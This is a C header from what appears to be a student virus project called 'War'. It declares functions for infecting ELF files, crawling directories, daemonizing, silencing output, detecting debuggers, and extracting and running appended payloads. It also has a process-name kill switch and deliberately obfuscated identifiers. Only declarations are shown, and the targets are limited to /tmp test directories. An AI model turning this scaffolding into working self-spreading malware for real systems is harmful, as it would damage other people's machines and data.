/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   war.h                                              :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: pboucher <pboucher@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/06/16 11:33:45 by pboucher          #+#    #+#             */
/*   Updated: 2026/06/16 11:33:47 by pboucher         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

typedef struct	s_exec_ctx
{
	char	exec_path[4096];

	char	**av;
	char	**envp;
}	t_exec_ctx;

#define SIGNATURE_STR "\0" "War version 1.0 (c)oded by mbatty-pboucher"
#define _WKq 		{"/tmp/test","/tmp/test2"}
#define _DOT(x) 	(!(*(x)^0x2e)&!*((x)+1))
#define _DDOT(x)	(!(*(x)^0x2e)&!(*(x+1)^0x2e)&!*(x+2))

// stops the virus if any process with this string in the name runs on the machine
#define BLOCKING_PROCESS "super_anti_virus"

#ifndef _Cc
# define _Cc const char *
#endif

bool	is_process_running(const char *name);

typedef struct s_footer
{
	uint64_t	magic;
	char		signature[sizeof(SIGNATURE_STR)];
	uint64_t	payload_size;
}	t_footer;

#define FOOTER_MAGIC 0x4242424242424242

t_footer	get_footer(const char *path);

#define I_AM_MAIN_PROCESS 1
#define I_AM_CHILD_PROCESS 0
#define I_AM_A_MISTAKE -1

int		daemonize();
int		mute_outputs();

char	*strjoin(char const *s1, char const *s2);
char 	*remove_last_n(char *str, size_t n);
char	*ft_itoa(int n);

int		infect_file(t_exec_ctx *fvvfewe, _Cc vfscsettbv);
int		crawl(t_exec_ctx *fwefewfewfew);

int		check_signature(const char *path);
int		check_elf_hdr(const char *path);
bool 	runningUnderDebugger();

int		extract_payload(const char *path, uint8_t **data, uint64_t *size);
int		exec_payload(t_exec_ctx *ctx, uint8_t *data, uint64_t size);
void	pack_payload(const char *bin1_path, const char *bin2_path, const char *resbin_path);
